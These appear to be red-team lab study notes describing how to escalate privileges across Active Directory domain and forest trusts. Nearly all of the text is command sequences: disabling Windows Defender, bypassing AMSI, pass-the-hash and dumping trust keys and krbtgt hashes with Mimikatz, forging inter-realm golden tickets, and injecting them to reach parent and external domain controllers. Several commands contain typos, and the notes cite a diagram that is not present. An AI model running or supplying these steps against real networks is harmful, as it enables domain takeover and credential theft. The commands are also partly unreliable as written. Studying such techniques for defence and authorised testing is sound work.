There are two (2) ways of escalatin privileges between two (2) domains of the same forest:
• krbtgt hash
• Trust tickets

• The Step 4 (Receive Inter-realm TGT in encrypted with the trust key) TGT is send to parent Domain DC.
• Parent domain DC checks for the trust key in "Receive Inter-realm TGT"
• Step 5 "Request TGS" which is send by client machine will be abused in the Cross Trust attacks. 

How to escalate privileges to Enterprise Admin or DA to the parent domain using the domain trust key
• Open PowerShell with Local Admin Rights.
• Run Set-MpPreference -DisableRealtimeMonitoring $true → This is to disabled Real time Windows ATP Monitoring for the current PS session.
• Run Invoke-Mimikatz -Command '"sekurlsa::pth /user:USERNAME /domain:FQDN_DOMAIN_Name /ntlm:NTLM_HASH /run:powershell.exe"' → This is initiate Session with DA access rights
• Import Invoke-Mimikatz into the Remote session
• Run $sess = New-PSSession -ComputerName FQDN_DOMAIN_Name
• Enter-PSSession -Session $sess 
• Run AMSIBypass code and then exit
• Invoke-Command -Session $sess -File Invoke-Mimikatz.ps1
• Enter-PSSession -Session $sessz
• Run Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName FQDN_CURRENT_DOMAIN_Name → This is get dump trust key and SIDS. Look for [In] trust key from child to parent. (In  Dollarcorp.moneycorp.local --> Moneycorp.local)
• OR 
• Invoke-Mimikatz -Command '"lsadump::dcsync /user:MACHINE-ACCOUNT_FOR_PARENT_DOMAIN_DC"' → This is dump trust key
• Run Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:FQDN_DOMAIN_Name /sid:SID_OF_CURRENT_DOMAIN /sids:SID_FOR_ENterprise_Admin_Parent_Domain /rc4:NTLM_HASH_FOR_DUMP_KEY /service:krbtgt /target:PARENT_FQDN_DOMAIN_Name /ticket:ticket_name.kirbi"' --> This is to forged Inter-Realm TGT. Step 4 from above diagram.
• Navigate to the Kekeo_old directory
• Run .\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi SERVICE_NAME/FQDN_Parent_DOMAIN_DC_Name → This to get TGS for the Parent domain DC.
• Run  .\kirbikator.exe lsa SERVICE_NAME/FQDN_Parent_DOMAIN_DC_Nami → This is convert the TGS and inject in PS session memory.
• Run klist.exe → To verify whether the ticket is in the memory.
• Run ls \\PARENT_DOMAIN_DC_FQDN_Name\C$ → To verify access on Parent domain DC. 

=========================================================================

How to escalate privileges to Enterprise Admin or DA to the parent domain using the krbtgt hash
• Open PowerShell with Local Admin Rights.
• Run Set-MpPreference -DisableRealtimeMonitoring $true → This is to disabled Real time Windows ATP Monitoring for the current PS session.
• Run Invoke-Mimikatz -Command '"sekurlsa::pth /user:USERNAME /domain:FQDN_DOMAIN_Name /ntlm:NTLM_HASH /run:powershell.exe"'  → This is initiate Session with DA access rights
• Import Invoke-Mimikatz into the Remote session
• Run $sess = New-PSSession -ComputerName FQDN_CURRENT_DOMAIN_Name
• Enter-PSSession -Session $sess 
• Run AMSIBypass code and then exit
• Invoke-Command -Session $sess -File Invoke-Mimikatz.ps1
• Enter-PSSession -Session $sess
• Run Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName FQDN_CURRENT_DOMAIN_Name → This is get dump trust key and SIDS. Look for [In] trust key from child to parent. (In  Dollarcorp.moneycorp.local --> Moenycorp.local)
• Invoke-Mimikatz -Command ‘"lsadump::lsa /patch"’ → This is get krbtgt hash of the current domain.
• Run Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:FQDN_DOMAIN_Name /sid:SID_OF_CURRENT_DOMAIN /sids:SID_FOR_ENterprise_Admin_Parent_Domain /rc4:NTLM_HASH_KRBTGT_ACCOUNT /service:krbtgt /target:PARENT_FQDN_DOMAIN_Name /ticket:ticket_name.kirbi"' → This is to forged Inter-Realm TGT. Step 4 from above diagram. 
• Run Invoke-Mimikatz -Command '"Kerberos::ptt Tickey_name.kirbii"'
• Run klist.exe → To verify whether the ticket is in the memory.
• Run ls \\PARENT_DOMAIN_DC_FQDN_Namel\C$ → To verify access on Parent domain DC. 

=========================================================================

Cross Trust Attacks
• Trying to access a shared directory / network drive etc that is accessible by DA of one forest in the external forest.

How to escalate privileges to the external forest using the domain trust key
• Open PowerShell with Local Admin Rights.
• Run Set-MpPreference -DisableRealtimeMonitoring $true → This is to disabled Real time Windows ATP Monitoring for the current PS session.
• Run Invoke-Mimikatz -Command '"sekurlsa::pth /user:USERNAME /domain:FQDN_CURRENT_DC_Name /ntlm:HASH_FOR_USER /run:powershell.exe"'  → This is initiate Session with DA access rights
• Import Invoke-Mimikatz into the Remote session
• Run $sess = New-PSSession -ComputerName FQDN_CURRENT_DC_Name
• Enter-PSSession -Session $sess 
• Run AMSIBypass code and then exit
• Invoke-Command -Session $sess -File Invoke-Mimikatz.ps1
• Enter-PSSession -Session $sess
• Invoke-Mimikatz -Command ‘"lsadump::lsa /patch"’ → This is get dump trust key for external forest/domain.
• Run Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:FQDN_CURRENT_DOMAIN_Namel /sid:SID_OF_CURRENT_DOMAIN /rc4:hash_for_external_forest /service:krbtgt /target:External_Forest_FQDN_Name /ticket:Ticket_name.kirbi"' → This is to forged Inter-Realm TGT. Step 4 from above diagram. 
• Run .\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi SERVICE_NAME/External_Forest_DC_FQDN_Name → This to get TGS for the Parent domain DC.
• Run  .\kirbikator.exe TGS_TICKET_NAME → This is convert the TGS and inject in PS session memory.
• Run klist.exe → To verify whether the ticket is in the memory.
• Run ls \\FQDN_External_DC_Name\Shared_Directory_name\ 
